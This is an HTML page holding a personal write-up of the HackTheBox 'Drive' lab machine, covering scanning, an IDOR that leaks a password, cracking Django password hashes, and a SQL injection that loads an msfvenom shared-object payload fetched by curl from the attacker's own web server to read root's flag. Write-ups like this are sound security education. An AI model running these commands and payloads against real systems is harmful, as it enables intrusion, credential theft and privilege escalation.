@@ -1,0 +1,859 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <title>Drive – Linux Easy · HonKit</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="HonKit 6.1.6">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/@honkit/honkit-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/@honkit/honkit-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+        <link rel="stylesheet" href="../../../styles/website.css">
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../../pwn/ret2win.html" />
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book honkit-cloak">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Home
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">👋 About Me</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../../../about/">
+            
+                <a href="../../../about/">
+            
+                    
+                    Who Am I?
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">🧠 CTF Writeups</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    HTB
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" >
+            
+                <span>
+            
+                    
+                    🧪 Binary Exploitation
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="3.2.1.1" data-path="drive.html">
+            
+                <a href="drive.html">
+            
+                    
+                    Drive – Linux Easy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.1.2" data-path="../../pwn/ret2win.html">
+            
+                <a href="../../pwn/ret2win.html">
+            
+                    
+                    ret2win – ExampleCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" >
+            
+                <span>
+            
+                    
+                    🔐 Cryptography
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.2.1" data-path="../../crypto/xor-madness.html">
+            
+                <a href="../../crypto/xor-madness.html">
+            
+                    
+                    XOR Madness – CryptoCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.3" >
+            
+                <span>
+            
+                    
+                    🌐 Web
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.3.1" data-path="../../web/jwt-abuse.html">
+            
+                <a href="../../web/jwt-abuse.html">
+            
+                    
+                    JWT Abuse – WebCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">🛠 Resources</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="../../../resources/tools.html">
+            
+                <a href="../../../resources/tools.html">
+            
+                    
+                    Tools I Use
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
+            Published with HonKit
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >Drive – Linux Easy</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="drive">Drive.</h1>
+<h2 id="difficulty-easy">Difficulty: EASY</h2>
+<h2 id="os-linux">OS: Linux</h2>
+<h3 id="enumeration">Enumeration:</h3>
+<p>Start with Rustscan and then nmap on the open ports.</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/machines/drive
+$ rustscan 10.10.11.235 --<span class="hljs-built_in">ulimit</span> 5000                                                                                                      [14:49:49]
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-<span class="hljs-string">' `-'</span>`-----<span class="hljs-string">'`----'</span>  `-<span class="hljs-string">'  `----'</span>  `---<span class="hljs-string">' `-'</span>  `-<span class="hljs-string">'`-'</span> `-<span class="hljs-string">'
+Faster Nmap scanning with Rust.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Nmap? More like slowmap.🐢
+
+[~] The config file is expected to be at "/home/m0j0/.config/rustscan/config.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.10.11.235:22
+Open 10.10.11.235:80
+[~] Starting Nmap
+[&gt;] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.235
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-15 14:50 BST
+Initiating Ping Scan at 14:50
+Scanning 10.10.11.235 [2 ports]
+Completed Ping Scan at 14:50, 0.02s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:50
+Completed Parallel DNS resolution of 1 host. at 14:50, 0.02s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 14:50
+Scanning 10.10.11.235 [2 ports]
+Discovered open port 22/tcp on 10.10.11.235
+Discovered open port 80/tcp on 10.10.11.235
+Completed Connect Scan at 14:50, 0.03s elapsed (2 total ports)
+Nmap scan report for 10.10.11.235
+Host is up, received conn-refused (0.019s latency).
+Scanned at 2023-10-15 14:50:24 BST for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
+</span></code></pre>
+<p><strong>Nmap</strong></p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/machines/drive
+$ nmap -p 22,80 -sCV 10.10.11.235                                                                                                          [14:53:00]
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-15 14:53 BST
+Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.235
+Host is up (0.019s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://drive.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.46 seconds
+</code></pre>
+<p>There’s a domain to add to <code>/etc/hosts</code> . It is a take on Google Drive xD.</p>
+<p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/82c6841a-c60e-4300-931e-62ae4aa19d48/898040f5-0738-4fa9-949d-7eedafe73b9e/Untitled.png" alt="Untitled"></img></p>
+<p>A register and login so I assume there is more but first let me fuzz for some sub-domains and directories in the background.</p>
+<p>I registered with -</p>
+<ul>
+<li>user = m0j0@test.com</li>
+<li>password = DearHTBHello</li>
+</ul>
+<p>I can now upload a file. </p>
+<p><strong>GoBuster:</strong></p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/machines/drive
+$ gobuster -m <span class="hljs-built_in">dir</span> -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://drive.htb                                                    [15:31:54]
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : <span class="hljs-built_in">dir</span>
+[+] Url/Domain   : http://drive.htb/
+[+] Threads      : 10
+[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2023/10/15 15:32:28 Starting gobuster
+=====================================================
+/contact (Status: 301)
+/favicon.ico (Status: 200)
+/home (Status: 301)
+/login (Status: 301)
+/logout (Status: 301)
+/register (Status: 301)
+/reports (Status: 301)
+/subscribe (Status: 301)
+/uploader (Status: 302)
+/upload (Status: 301)
+/upload_file (Status: 302)
+/uploaded (Status: 302)
+/uploadedimages (Status: 302)
+/upload_files (Status: 302)
+/uploadfile (Status: 302)
+/uploadedfiles (Status: 302)
+/uploadfiles (Status: 302)
+/uploads (Status: 302)
+=====================================================
+2023/10/15 15:32:44 Finished
+=====================================================
+</code></pre>
+<p>I wonder is it a file upload or is that a rabbit-hole?? It is a rabbit hole</p>
+<p>So it turns out the id parameter has an IDOR vuln and I can FUZZ or use a python script to do it I’ll show both wfuzz worked for me:</p>
+<pre><code>NOTE:
+hey team after the great success of the platform we need now to continue the work.
+on the new features for ours platform.
+I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".
+please make the necessary changes to the code before the end of the month
+I will reach you soon with the token to apply your changes on the repo
+thanks!
+</code></pre><p>Heres the FUZZ and script:</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/drive master ⚡
+$ wfuzz -u http://drive.htb/FUZZ/block/ -z range,0-200 -H <span class="hljs-string">"Cookie:csrftoken=H8kKPtUUxBrKElKWZd00GZJKvMokw0Ez; sessionid=5b6n3ar3gzp80m9enr2mkwvttuwtyb4o"</span> --hc 404
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://drive.htb/FUZZ/block/
+Total requests: 201
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                              
+=====================================================================
+
+000000080:   200        174 L    424 W      5438 Ch     <span class="hljs-string">"79"</span>                                                                                 
+000000101:   200        175 L    382 W      5195 Ch     <span class="hljs-string">"100"</span>                                                                                
+000000099:   200        170 L    365 W      5016 Ch     <span class="hljs-string">"98"</span>                                                                                 
+000000100:   200        170 L    372 W      5058 Ch     <span class="hljs-string">"99"</span>                                                                                 
+000000102:   200        176 L    416 W      5478 Ch     <span class="hljs-string">"101"</span>
+</code></pre>
+<p>Going to 79 gives me the note with pass.
+<strong>python script</strong> (iDomino):</p>
+<pre><code class="lang-python">m0j0@r1s1n: ~/HTB/machines/drive
+$ cat fuzz.py                                                                                                                               [<span class="hljs-number">2</span>:01:<span class="hljs-number">54</span>]
+<span class="hljs-keyword">import</span> requests
+
+cookies = {
+    <span class="hljs-string">'sessionid'</span>: <span class="hljs-string">'5b6n3ar3gzp80m9enr2mkwvttuwtyb4o'</span>
+}
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">200</span>):
+    url = <span class="hljs-string">f'http://drive.htb/%31%31%32/getFileDetail/'</span>
+    resp = requests.get(url,cookies=cookies)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'unauthorized'</span> <span class="hljs-keyword">in</span> resp.text:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">'File'</span>,i,<span class="hljs-string">'exists!'</span>)
+</code></pre>
+<p>Doesn’t work for me 😟and it looks like wfuzz code, anyway lets log in.</p>
+<pre><code class="lang-bash">martin@drive:~$ <span class="hljs-built_in">id</span>
+uid=1001(martin) gid=1001(martin) <span class="hljs-built_in">groups</span>=1001(martin)
+</code></pre>
+<p>Time to enumerate martin as there is no user text. There are other ports open in martins shell.</p>
+<pre><code class="lang-bash">martin@drive:~$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*
+</code></pre>
+<p>There is SQL (3306) and Gitea (3000) i will forward the Gites to see if there is any info.
+This is interesting a SQLite3 DB with:</p>
+<pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash</span>
+DB=<span class="hljs-variable">$1</span>
+date_str=$(<span class="hljs-built_in">date</span> +<span class="hljs-string">'%d_%b'</span>)
+7z a -p<span class="hljs-string">'H@ckThisP@ssW0rDIfY0uC@n:)'</span> /var/www/backups/<span class="hljs-variable">${date_str}</span>_db_backup.sqlite3.7z db.sqlite3
+<span class="hljs-built_in">cd</span> /var/www/backups/
+<span class="hljs-built_in">ls</span> -l --<span class="hljs-built_in">sort</span>=t *.7z &gt; backups_num.tmp
+backups_num=$(<span class="hljs-built_in">cat</span> backups_num.tmp | <span class="hljs-built_in">wc</span> -l)
+<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$backups_num</span> -gt 10 ]]; <span class="hljs-keyword">then</span>
+      <span class="hljs-comment">#backups is more than 10... deleting to oldest backup</span>
+      <span class="hljs-built_in">rm</span> $(<span class="hljs-built_in">ls</span>  *.7z --<span class="hljs-built_in">sort</span>=t --color=never | <span class="hljs-built_in">tail</span> -1)
+      <span class="hljs-comment">#oldest backup deleted successfully!</span>
+<span class="hljs-keyword">fi</span>
+<span class="hljs-built_in">rm</span> backups_num.tmp
+</code></pre>
+<p>If I can get the backups, maybe I can with scp:</p>
+<pre><code class="lang-bash">scp -r <span class="hljs-string">"martin@drive.htb:/var/www/backups/"</span> .
+</code></pre>
+<p>This should drop the files locally using the password found and it does, It sis amd I was able to dump a DB with hashes:</p>
+<pre><code class="lang-bash">:34.294890<span class="hljs-string">',1,'</span>admin<span class="hljs-string">','</span><span class="hljs-string">','</span><span class="hljs-string">','</span>admin@drive.htb<span class="hljs-string">',1,1,'</span>2022-12-08 14:59:02.802351<span class="hljs-string">');
+INSERT INTO accounts_customuser VALUES(21,'</span>pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO<span class="hljs-variable">$So15</span>//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=<span class="hljs-string">','</span>2022-12-24 22:39:42.847497<span class="hljs-string">',0,'</span>jamesMason<span class="hljs-string">','</span><span class="hljs-string">','</span><span class="hljs-string">','</span>jamesMason@drive.htb<span class="hljs-string">',0,1,'</span>2022-12-23 12:33:04.637591<span class="hljs-string">');
+INSERT INTO accounts_customuser VALUES(22,'</span>pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY<span class="hljs-variable">$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM</span>=<span class="hljs-string">','</span>2022-12-24 12:55:10.152415<span class="hljs-string">',0,'</span>martinCruz<span class="hljs-string">','</span><span class="hljs-string">','</span><span class="hljs-string">','</span>martin@drive.htb<span class="hljs-string">',0,1,'</span>2022-12-23 12:35:02.230289<span class="hljs-string">');
+INSERT INTO accounts_customuser VALUES(23,'</span>pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW<span class="hljs-variable">$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro</span>=<span class="hljs-string">','</span>2022-12-26 06:20:23.299662<span class="hljs-string">',0,'</span>tomHands<span class="hljs-string">','</span><span class="hljs-string">','</span><span class="hljs-string">','</span>tom@drive.htb<span class="hljs-string">',0,1,'</span>2022-12-23 12:37:45<span class="hljs-string">');
+INSERT INTO accounts_customuser VALUES(24,'</span>pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa<span class="hljs-variable">$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0</span>/jjXK0RDcP6U=<span class="hljs-string">','</span>2022-12-24 16:51
+</code></pre>
+<p>They looked hard to crack.Checking another DB I found SHA1 hashes which might be easier.</p>
+<p>They where:</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/machines/drive
+$ hashcat -m 124 hashs /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt                                                                 [3:58:27]
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span>
+=====================================================================================================================================
+* Device <span class="hljs-comment">#1: pthread-Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 6870/13805 MB (2048 MB allocatable), 4MCU</span>
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimim salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 5 digests; 5 unique digests, 5 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Iterated
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c
+
+Host memory required <span class="hljs-keyword">for</span> this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+sha1$Ri2bP6RVoZD5XYGzeYWr7c<span class="hljs-variable">$4053cb928103b6a9798b2521c4100db88969525a</span>:johnmayer7
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better <span class="hljs-keyword">for</span> specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.           
+
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 124 (Django (SHA-1))
+Hash.Target......: hashs
+Time.Started.....: Thu Oct 19 04:00:16 2023 (12 secs)
+Time.Estimated...: Thu Oct 19 04:00:28 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  5079.3 kH/s (0.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/5 (20.00%) Digests, 1/5 (20.00%) Salts
+Progress.........: 71721920/71721920 (100.00%)
+Rejected.........: 0/71721920 (0.00%)
+Restore.Point....: 14344384/14344384 (100.00%)
+Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: <span class="hljs-variable">$HEX</span>[206b6d3831303838] -&gt; <span class="hljs-variable">$HEX</span>[042a0337c2a156616d6f732103]
+Hardware.Mon.#1..: Temp: 69c Util: 77%
+
+Started: Thu Oct 19 03:59:37 2023
+Stopped: Thu Oct 19 04:00:29 2023
+FAIL: 1
+</code></pre>
+<p><code>sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7</code></p>
+<p>Who is this for?</p>
+<pre><code class="lang-bash">
+INSERT INTO accounts_customuser VALUES(21,<span class="hljs-string">'sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a'</span>,<span class="hljs-string">'2022-12-26 05:48:27.497873'</span>,0,<span class="hljs-string">'jamesMason'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'jamesMason@drive.htb'</span>,0,1,<span class="hljs-string">'2022-12-23 12:33:04'</span>);
+INSERT INTO accounts_customuser VALUES(22,<span class="hljs-string">'sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f'</span>,<span class="hljs-string">'2022-12-24 12:55:10'</span>,0,<span class="hljs-string">'martinCruz'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'martin@drive.htb'</span>,0,1,<span class="hljs-string">'2022-12-23 12:35:02'</span>);
+INSERT INTO accounts_customuser VALUES(23,<span class="hljs-string">'sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a'</span>,<span class="hljs-string">'2022-12-24 13:17:45'</span>,0,<span class="hljs-string">'tomHands'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'tom@drive.htb'</span>,0,1,<span class="hljs-string">'2022-12-23 12:37:45'</span>);
+INSERT INTO accounts_customuser VALUES(24,<span class="hljs-string">'sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f'</span>,<span class="hljs-string">'2022-12-24 16:51:53'</span>,0,<span class="hljs-string">'crisDisel'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'cris@drive.htb'</span>,0,1,<span class="hljs-string">'2022-12-23 12:39:15'</span>);
+INSERT INTO accounts_customuser VALUES(30,<span class="hljs-string">'sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3'</span>,<span class="hljs-string">'2022-12-26 05:43:40.388717'</span>,1,<span class="hljs-string">'admin'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'admin@drive.htb'</span>,1,1,<span class="hljs-string">'2022-12-26 05:30:58.003372'</span>);
+</code></pre>
+<p>It ends in 25a which is tom I’ll try su first with the pass. And I’m tom and get user 😀</p>
+<h3 id="priv-esc-and-root">Priv Esc and Root.</h3>
+<p>hmmmmmmmmmmm</p>
+<p>So I got the doodlegrive binary by scp to my machine and found creds.</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/drive master ⚡
+$ scp -r tom@drive.htb:/home/tom/doodleGrive-cli .                                                                                          [6:07:51]
+tom@drive.htb<span class="hljs-string">'s password: 
+doodleGrive-cli
+</span></code></pre>
+<pre><code class="lang-bash">004022d5 48 8d 35        LEA        RSI,[s_moriarty_0049743f]                        = <span class="hljs-string">"moriarty"</span>
+                 63 51 09 00
+        004022dc 48 89 c7        MOV        RDI,RAX
+        004022df e8 4c ee        CALL       strcmp                                           int strcmp(char * __s1, char * _
+                 ff ff
+        004022e4 85 c0           TEST       EAX,EAX
+        004022e6 75 2a           JNZ        LAB_00402312
+        004022e8 48 8d 45 c0     LEA        RAX=&gt;local_48,[RBP + -0x40]
+        004022ec 48 8d 35        LEA        RSI,[s_findMeIfY0uC@nMr.Holmz!_00497448]         = <span class="hljs-string">"findMeIfY0uC@nMr.Holmz!"</span>
+                 55 51 09 00
+        004022f3 48 89 c7        MOV        RDI,RAX
+        004022f6 e8 35 ee        CALL       strcmp                                           int strcmp(char * __s1, char * _
+                 ff ff
+        004022fb 85 c0           TEST       EAX,EAX
+        004022fd 75 13           JNZ        LAB_00402312
+        004022ff 48 8d 3d        LEA        RDI,[s_Welcome...!_00497460]                     = <span class="hljs-string">"Welcome...!"</span>
+                 5a 51 09 00
+        00402306 e8 95 79        CALL       puts                                             int puts(char * __s)
+                 01 00
+        0040230b e8 96 fd        CALL       main_menu                                        undefined main_menu()
+                 ff ff
+        00402310 eb 0c           JMP        LAB_0040231e
+                             LAB_00402312                                    XREF[2]:     004022e6(j), 004022fd(j)  
+        00402312 48 8d 3d        LEA        RDI,[s_Invalid_username_or_password._0049746c]   = <span class="hljs-string">"Invalid username or password."</span>
+                 53 51 09 00
+</code></pre>
+<p>I wonder can I launch the app?
+The trick here is to build a payload using msfvenom, I had to switch to Kali as my Ubuntu MSF seemed to crash.</p>
+<p>So load_extension is enabled. I create a file locally:</p>
+<pre><code class="lang-bash">m0j0@r1s1n: ~/HTB/retired_boxes/hackthebox_notes/drive master ⚡
+$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span>                                                                                                                   [3:10:49]
+moriarty
+findMeIfY0uC@nMr.Holmz!
+5
+<span class="hljs-string">"+load_extension(char(46,47,97))--
+6`
+</span></code></pre>
+<p>I then realised I needed Kali so:</p>
+<pre><code class="lang-bash">┌──(m0j0㉿r1s1n)-[~/HTB/machines/drivw]
+└─$ msfvenom -p linux/x64/exec -f elf-so CMD=<span class="hljs-string">'id;cat /root/root.txt'</span>  &gt; a.so
+^[t^[t[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 58 bytes
+Final size of elf-so file: 460 bytes
+
+
+┌──(m0j0㉿r1s1n)-[~/HTB/machines/drivw]
+└─$ <span class="hljs-built_in">ls</span>
+a.so  <span class="hljs-built_in">test</span>
+
+┌──(m0j0㉿r1s1n)-[~/HTB/machines/drivw]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.235 - - [20/Oct/2023 18:20:43] <span class="hljs-string">"GET /a.so HTTP/1.1"</span> 200 -
+10.10.11.235 - - [20/Oct/2023 18:24:52] <span class="hljs-string">"GET /a.so HTTP/1.1"</span> 200 -
+10.10.11.235 - - [20/Oct/2023 18:28:12] <span class="hljs-string">"GET /a.so HTTP/1.1"</span> 200 -
+10
+</code></pre>
+<p>Built payload and test file again and started a server, Now the fun bit</p>
+<p>In toms shell call the test file and are malicious <code>.so</code>file:</p>
+<pre><code class="lang-bash">tom@drive:~$ curl http://10.10.14.17:8000/a.so -o a.so; curl http://10.10.14.17:8000/test -o <span class="hljs-built_in">test</span>; ./doodleGrive-cli &lt; <span class="hljs-built_in">test</span>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   460  100   460    0     0   9200      0 --:--:-- --:--:-- --:--:--  9200
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    73  100    73    0     0   1237      0 --:--:-- --:--:-- --:--:--  1237
+[!]Caution this tool still <span class="hljs-keyword">in</span> the development phase...please report any issue to the development team[!]
+Enter Username:
+Enter password <span class="hljs-keyword">for</span> moriarty:
+Welcome...!
+
+doodleGrive cli beta-2.2: 
+1. Show <span class="hljs-built_in">users</span> list and info
+2. Show <span class="hljs-built_in">groups</span> list
+3. Check server health and status
+4. Show server requests <span class="hljs-built_in">log</span> (last 1000 request)
+5. activate user account
+6. Exit
+Select option: Enter username to activate account: Activating account <span class="hljs-keyword">for</span> user <span class="hljs-string">'"+load_extension(char(46,47,97))--'</span>...
+uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1003(tom)
+9386192288eb3d65d1eb41c47e1fe865
+
+doodleGrive cli beta-2.2: 
+1. Show <span class="hljs-built_in">users</span> list and info
+2. Show <span class="hljs-built_in">groups</span> list
+3. Check server health and status
+4. Show server requests <span class="hljs-built_in">log</span> (last 1000 request)
+5. activate user account
+6. Exit
+Select option: exiting...
+tom@drive:~$
+</code></pre>
+<p>I can read root.txt 😄 I will try for a shell later.
+Oh big thanks to Idomino for the learnings</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
